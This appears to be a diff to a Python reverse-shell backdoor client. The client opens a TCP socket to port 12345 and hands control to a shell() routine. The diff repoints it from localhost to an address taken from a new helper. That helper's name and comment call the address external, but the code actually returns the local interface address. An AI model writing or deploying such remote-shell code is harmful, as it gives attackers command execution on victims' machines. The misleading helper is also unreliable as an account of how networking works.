@@ -4,6 +4,17 @@ import socket
 import subprocess
 
 
+def get_external_ipv4_address():
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        # Connect to a public DNS server to get the external IP address
+        sock.connect(('8.8.8.8', 80))
+        ip_address = sock.getsockname()[0]
+    finally:
+        sock.close()
+    return ip_address
+
+
 def reliable_send(data):
     json_data = json.dumps(data)
     sock.send(json_data.encode())
@@ -35,7 +46,8 @@ def shell():
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect(("127.0.0.1", 12345))
+ipv4 = get_external_ipv4_address()
+sock.connect((f"{ipv4}", 12345))
 print("Connection stablished to server!")
 shell()
 sock.close()
